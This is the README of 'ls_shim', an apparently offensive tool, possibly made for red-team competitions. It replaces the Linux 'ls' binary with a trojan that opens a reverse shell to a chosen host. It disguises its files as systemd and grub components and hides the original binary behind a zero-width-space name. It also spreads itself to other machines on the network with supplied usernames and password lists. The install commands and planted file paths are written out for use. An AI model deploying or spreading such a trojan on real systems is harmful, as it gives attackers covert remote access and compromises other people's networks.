# ls_shim

Tool that shims the `ls` binary and establishes a reverse shell with a specified host. This tool disguises itself as the `ls` binary as well as part of `systemd`.

## Dependencies

To run this project, you will need to have `golang` installed.
You can run `deploy/dependencies.sh` to install this automatically, or
run the commands below based on your distro:

Ubuntu/Debian
```bash
apt-get install golang-go
```
CentOS/RHEL
```bash
yum install golang
```
Arch
```bash
pacman -S go
```

## Installation

To install this project, simply run the `install.sh` script as root. You may also optionally supply the `--replicate` flag to have ls_shim install itself onto every other device on the network..Any parameters following `--replicate` will be passed to `deploy.go`. Please see the `deploy/readme.md` for more information on deployment arguments. Examples:

```bash
#Basic install
./install.sh

#Install with replication
#This will install on the remote system, and run deploy.go with default parameters: -u whiteteam -p whiteteam -m
./install.sh --replicate

#Installation examples with custom replication parameters
./install.sh --replicate -u jsmith -p foo -v
./install.sh --replicate -u jsmith --password-list foo,bar,hi -m
```


## Files created/modified

This project will create the following files:
```
/usr/bin/systemd-make
/usr/bin/systemd-restart
/usr/sbin/grub-display
/var/run/systemd.pid
```

In addition to these files, the installation will replace the `ls` binary with the compiled result from `ls_over.go`, and rename the `ls` binary to have a zero-width space in its filename.

